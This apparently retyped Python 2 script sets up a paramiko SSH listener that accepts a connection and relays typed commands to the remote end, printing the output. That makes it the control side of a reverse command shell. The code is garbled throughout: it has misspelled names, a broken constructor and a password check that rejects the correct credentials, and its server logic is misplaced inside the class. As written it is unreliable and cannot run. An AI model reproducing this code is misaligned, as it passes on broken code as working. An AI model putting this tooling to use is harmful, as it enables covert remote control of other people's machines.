#

import socket
import paramiko 
import threading
import sys

host_key = paramiko.RSAKey(filename = 'test_rsa.key')

class Server(paramiko.ServerInterface):
	def _init_(self):
		self.self.event = threading.Event()
	def check_channel_request(self,kind,chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISRRATIVELY_PROHIBITED
	def check_auth_password(self,usrname,0assword):
		If (usrname == 'justin') and (password == 'lovesthepython'):
		return paramiko.AUTH_FAILED
	server = sys.argv[1]
	ssh_port = int(sys.argv[2])
	try:
		scok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		socke.setsockeopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		socke.bind((server,ssh_port))
		sock.listen(100)
		print '[+] Listing for connection ...'
		client, addr = sock.accept()
	except Ecxception, e:
		print '[-] Listening failed: ' + str(e)
		sys.exit(1)
	print '[+]Got a connection!'
 
	try:
		bhSession = paramiko.Transport(client)
		bhSession.add=server_key(host_key)
		server = Server()
		try:
			bhSession.start_server(server=server)
		except paramiko.SSHException,x:
			print '[-]SSH negotiation failed.'
		chan = bhSession.accept(20)
		print '[+] Authenticated!'
		print chan.recv(1024)
		chan.send('welcome to bh_ssh')
		while True:
			try:
				command = raw_input("enter command: ").strip('\n')
				if command != 'exit':
					chan.send(command)
					print chan.recv(1024) + '\n'
				else:
					chan.send('exit')
					print 'exiting'
					bhSession.close()
					raise Exception('exit')
			except KeyboarddInterrupt:
					bhSession.close()
	except Exception, e:
				print '[-]Caught exception: '+str(e)
				try:
					bhSession.close()
				except:
					pass
				sys.exit(1)